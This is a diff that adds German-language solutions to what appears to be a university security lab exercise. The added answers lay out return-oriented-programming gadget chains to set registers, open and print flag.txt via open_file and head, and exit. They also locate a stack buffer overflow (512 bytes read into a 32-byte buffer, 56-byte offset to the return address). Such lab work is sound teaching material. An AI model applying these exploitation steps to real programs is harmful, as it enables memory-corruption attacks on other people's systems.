@@ -85,3 +85,19 @@ Jetzt verknüpfen wir die beiden Teile:
   * Da der negierte Wert aus RAX nun an some_buffer_addr vorliegt, funktioniert es, dass RCX auf some_buffer_addr gesetzt wird. Somit kann dann durch Gadget 11 der zwischengespeicherte negierte RAX-Wert an der Adresse some_buffer_addr nach RDX geladen werden.
   * Als letzten Schritt wird Gadget 13 genutzt, um in RDX den negierten Wert von RAX wieder zurückzugenieren.
 Somit ist die ROP-Chain, um MOV RDX, RAX zu simulieren: G1 - G9 - some_buffer_addr - G3 - G8 - some_buffer_addr - (beliebiger Dummy-Wert) - G11 - (beliebiger Dummy-Wert) - G13
+
+
+## 2.2 Erweitern Sie exploit.py zu einem funktionsfähigen Exploit. Der Exploit soll zuerst open_file mit den richtigen Parametern aufrufen, um die Datei flag.txt zu öffnen. Verwenden Sie danach die Funktion head, um die Datei auszugeben.
+Die Gesamt-ROP-Chain ist wie folgt (s. exploit.py):
+MOV RDI, flag_path_addr <=> G9 - flag_path_addr - G6 - G12
+MOV RSI, readonly_mode_addr <=> G8 - readonly_mode_addr - 0 - G5
+CALL open_file <=> open_file_function_addr
+MOV RDI, some_buffer_addr <=> G9 - some_buffer_addr - G6 - G12
+MOV RSI, 200 <=> G8 - 200 - 0 - G5
+MOV RDX, RAX <=> G1 - G9 - some_buffer_addr - G3 - G8 - some_buffer_addr - (beliebiger Dummy-Wert) - G11 - (beliebiger Dummy-Wert) - G13
+CALL head <=> head_function_addr
+MOV RDI, 0 <=> G6
+CALL exit <=> exit_function_addr
+
+## 3.1 Überschreiben Sie die Return-Adresse zuerst mit dem Wert 0x4141414141414141, um zu demonstrieren, dass Sie den Instruction Pointer übernehmen können. Wo im Programm ist die Schwachstelle? Welchen Input müssen Sie dem Programm schicken? Wie lang ist der Input?
+Im Programm ist die Schwachstelle in Z. 23. Dort werden 512 Zeichen in einen 32 Zeichen langen Buffer eingelesen. Um den Instruction-Pointer zu überschreiben, müssen 56 Bytes eingegeben werden, zzgl. 8 "A"-Bytes, um den Instruction Pointer auf 0x4141414141414141 setzen zu können.
